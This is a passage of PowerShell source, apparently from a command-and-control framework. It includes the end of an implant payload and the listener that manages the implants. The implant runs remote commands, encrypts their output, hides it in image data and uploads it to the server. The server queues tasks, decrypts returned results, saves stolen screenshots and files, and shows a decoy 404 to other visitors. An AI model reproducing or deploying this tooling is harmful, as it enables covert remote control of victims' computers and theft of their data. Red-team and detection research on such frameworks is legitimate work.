                                $Output = Encrypt-String2 $key $Output
                                $UploadBytes = getimgdata $Output
                                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                            } catch {
                                $Output = "ErrorLoadMod: " + $error[0]
                            }
                        } else {
                            try {
                                $Output = Invoke-Expression $i | out-string  
                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                $StdError = ($error[0] | Out-String)
                                if ($StdError){
                                $Output = $Output + $StdError
                                $error.clear()
                                }
                            } catch {
                                $Output = "ErrorCmd: " + $error[0]
                            }
                            try {
                            $Output = Encrypt-String2 $key $Output
                            $Response = Encrypt-String $key $i
                            $UploadBytes = getimgdata $Output
                            (Get-Webclient -Cookie $Response).UploadData("$Server", $UploadBytes)|out-null
                            } catch{}
                        }
                    } 
            }
            elseif  ($ReadCommandClear.ToLower().StartsWith("upload-file")) {
                try {
                $Output = Invoke-Expression $ReadCommandClear | out-string
                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                if ($ReadCommandClear -match ("(.+)Base64")) { $result = $Matches[0] }
                $ModuleLoaded = Encrypt-String $key $result
                $Output = Encrypt-String2 $key $Output
                $UploadBytes = getimgdata $Output
                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                } catch {
                    $Output = "ErrorUpload: " + $error[0]
                }

            } elseif  ($ReadCommandClear.ToLower().StartsWith("loadmodule")) {
                try {
                $modulename = $ReadCommandClear -replace "LoadModule",""
                $Output = Invoke-Expression $modulename | out-string  
                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
                $Output = Encrypt-String2 $key $Output
                $UploadBytes = getimgdata $Output
                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                } catch {
                    $Output = "ErrorLoadMod: " + $error[0]
                }

            } else {
                try {
                    $Output = Invoke-Expression $ReadCommandClear | out-string  
                    $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                    $StdError = ($error[0] | Out-String)
                    if ($StdError){
                    $Output = $Output + $StdError
                    $error.clear()
                    }
                } catch {
                    $Output = "ErrorCmd: " + $error[0]
                }
            try {
            $Output = Encrypt-String2 $key $Output
            $UploadBytes = getimgdata $Output
            (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
            } catch {}
            }
        }
    break
    }
}'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($message)
$message =[Convert]::ToBase64String($Bytes)

    }

    $randomuriagents = Invoke-SqliteQuery -DataSource $Database -Query 'SELECT RandomURI FROM Implants' -As SingleValue
            
    foreach ($ranuri in $randomuriagents) 
    {
    if ($ranuri -ne $null) 
    {
        $im_results = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants WHERE RandomURI='$ranuri'" -As PSObject
        $key = $im_results.Key
        $hostname = $im_results.Hostname
        $currenttime = (Get-Date)
        $multicmdresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM NewTasks WHERE RandomURI='$ranuri'" -As PSObject
        # send multi commands to the client 
        if (($request.Url -like "*$ranuri*") -and ($request.HttpMethod -eq 'GET') -and ($multicmdresults))
        {
            $message = $null
            foreach ($i in $multicmdresults) {
                $taskid = $i.Command
                $taskidtime = $i.TaskID

                if (!$taskid.ToLower().startswith('fvdsghfdsyyh')) {
                    Write-Host "Command issued against host: $hostname" -ForegroundColor Yellow
                    if  ($taskid.ToLower().startswith('upload-file')) {
                    Write-Host -Object "Uploading File" -ForegroundColor Yellow
                    } else {
                    Write-Host -Object $taskid -ForegroundColor Yellow
                    }
                }
                if ($taskid.ToLower().StartsWith("loadmodule")) 
                {
                    $modulename = $taskid -replace 'LoadModule ', '' 
                    if (Test-Path "$PoshPath\Modules\$modulename") {
                    $module = (Get-Content -Path "$PoshPath\Modules\$modulename") -join "`n"
                    # ensure the module name 
                    $module = "LoadModule"+$module
                    if ($message) {
                        $message = $message + "!d-3dion@LD!-d" + $module
                    } else {
                        $message = $module 
                    }
                    } else {
                    Write-Host "Error finding module"
                    }
                }
                else 
                {
                    if ($message) {
                        $message = $message + "!d-3dion@LD!-d" + $taskid
                    } else {
                        $message = $taskid 
                    }
                }
                Invoke-SqliteQuery -DataSource $Database -Query "DELETE FROM NewTasks WHERE RandomURI='$ranuri' and TaskID='$taskidtime'"|out-null
            }

            if ($multicmdresults.Count -gt 1){
                $message = "multicmd" + $message
            }
            Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET LastSeen='$(get-date)' WHERE RandomURI='$ranuri'"|out-null
            $fromstring = Encrypt-String $key $message
            $commandsent = $fromstring
            $message = $fromstring                    
        }
        
        # send the default command/response if there is no command
        if (($request.Url -like "*$ranuri*") -and ($request.HttpMethod -eq 'GET') -and ($multicmdresults.Count -eq 0)) 
        { 
            Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET LastSeen='$(get-date)' WHERE RandomURI='$ranuri'"|out-null
            $message = 'fvdsghfdsyyh'
            $fromstring = Encrypt-String $key $message
            $commandsent = $fromstring
            $message = $fromstring
        } 

        # a completed command has returned to the c2 server
        if (($request.Url -like "*$ranuri*") -and ($request.HttpMethod -eq 'POST')) 
        { 
            $responseStream = $request.InputStream 
            $targetStream = New-Object -TypeName System.IO.MemoryStream 
            $buffer = new-object byte[] 10KB 
            $count = $responseStream.Read($buffer,0,$buffer.length) 
            $downloadedBytes = $count 
            while ($count -gt 0) 
            { 
                $targetStream.Write($buffer, 0, $count) 
                $count = $responseStream.Read($buffer,0,$buffer.length) 
                $downloadedBytes = $downloadedBytes + $count 
            } 

            $len = $targetStream.length
            $size = $len + 1
            $size2 = $len -1
            $buffer = New-Object byte[] $size
            $targetStream.Position = 0
            $targetStream.Read($buffer, 0, $targetStream.Length)|Out-null

            $targetStream.Flush()
            $targetStream.Close() 
            $targetStream.Dispose()

            # if you want to look at the image that is transfered back each time :)
            # [io.file]::WriteAllBytes("$global:newdir\TempHeuristicImage.png", $Buffer)
            $encryptedString = $buffer[1500..$size2]
            $cookiesin = $request.Cookies -replace 'SessionID=', ''
            $cookieplaintext = Decrypt-String $key $cookiesin   

            try {
            $backToPlainText = Decrypt-String2 $key $encryptedString
            }
            catch{             
            $backToPlainText = "Unable to decrypt message from host"
            $error.clear()
            $cookieplaintext = "Unable to decrypt message from host: $cookieplaintext. Could be too large and truncating data!"
            }
            
            # if the task was a screenshot, dump it directly to disk
            if ($cookieplaintext.tolower().startswith('get-screenshot'))
            {
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
                try{
                $randomimageid = Get-RandomURI -Length 15
                $imagepath = "$global:newdir\downloads\$randomimageid.png"
                #Convert Base64 to Image
                $backToPlainText = $backToPlainText -replace '123456(.+?)654321', ''
                $imageBytes = [Convert]::FromBase64String($backToPlainText)
                $ms = New-Object -TypeName IO.MemoryStream -ArgumentList ($imageBytes, 0, $imageBytes.Length)
                $ms.Write($imageBytes, 0, $imageBytes.Length)
                $image = [System.Drawing.Image]::FromStream($ms, $true)
                $image.Save("$imagepath")
                $backToPlainText = "Captured Screenshot: $global:newdir\downloads\$randomimageid.png 123456<>654321"
                }
                catch {
                $backToPlainText = "Screenshot not captured, the screen could be locked or this user does not have access to the screen!"
                Write-Host "Screenshot not captured, the screen could be locked or this user does not have access to the screen!" -ForegroundColor Red
                }
                $backToPlainText = "Captured Screenshot: $global:newdir\downloads\$randomimageid.png 123456<>654321"
            }
            # if the task was to download a file, dump it directly to disk
            if  ($cookieplaintext.tolower().startswith('download-file'))
            {
                try {
                $file = split-path $cookieplaintext -leaf
                $file = $file -replace "'", ""
                $file = $file.split('\.')[-1]
                $ramdomfileext = Get-RandomURI -Length 15
                $targetfile = "$global:newdir\downloads\$ramdomfileext.$file"   
                $backToPlainText = $backToPlainText -replace '123456(.+?)654321', ''        
                $fileBytes = [Convert]::FromBase64String($backToPlainText)
                [io.file]::WriteAllBytes($targetfile, $fileBytes)
                write-host "Downloaded file: $targetfile" -ForegroundColor Green

                } catch {
                Write-Host "File not downloaded, the size could be too large or the user may not have permissions!" -ForegroundColor Red
                }
                $backToPlainText = "Downloaded file: $targetfile 123456<>654321"
            }

            if ($backToPlainText -match '123456(.+?)654321')
            {$cmdlineinput = $matches[1]}
            $Query = 'INSERT
                INTO CompletedTasks (TaskID, RandomURI, Command, Output, Prompt)
            VALUES (@TaskID, @RandomURI, @Command, @Output, @Prompt)'

            Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                TaskID    = (Get-Date)
                RandomURI = "$ranuri"
                Command   = $cookieplaintext
                Output    = $backToPlainText -replace '123456(.+?)654321', ''
                Prompt    = $cmdlineinput
            }|out-null
            $message = "     "
        }
    }
    }

    # if a web request comes in that is not for the c2 server, send default 404 response
    if (!$message) {
        $message = $httpresponse
        Write-Output (Get-Date) | Out-File $global:newdir\Webserver.log -Append
        Write-Output $request | Out-File $global:newdir\Webserver.log -Append
    }
    
    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
    $response.ContentLength64 = $buffer.length
    $response.StatusCode = 200
    $response.Headers.Add("CacheControl", "no-cache, no-store, must-revalidate")
    $response.Headers.Add("Pragma", "no-cache")
    $response.Headers.Add("Expires", 0)
    $output = $response.OutputStream
    $output.Write($buffer, 0, $buffer.length)
    $output.Close()
    $message = $null
    $resultsdb = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM CompletedTasks WHERE CompletedTaskID=$taskiddb" -as PSObject
    if ($resultsdb)
    {
    $ranuri = $resultsdb.RandomURI
    $im_result = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants WHERE RandomURI='$ranuri'" -as PSObject
    $implanthost = $im_result.User
    $im = Invoke-SqliteQuery -DataSource $Database -Query "SELECT User FROM Implants WHERE RandomURI='$ranuri'" -as SingleValue

        $taskcompledtime = $resultsdb.TaskID
        Write-Host "Command returned against host:" $im_result.Hostname $im_result.Domain "($taskcompledtime)" -ForegroundColor Green
        Write-Host -Object $resultsdb.Output -ForegroundColor Green
        $taskiddb ++
    }
}

$listener.Stop()
}
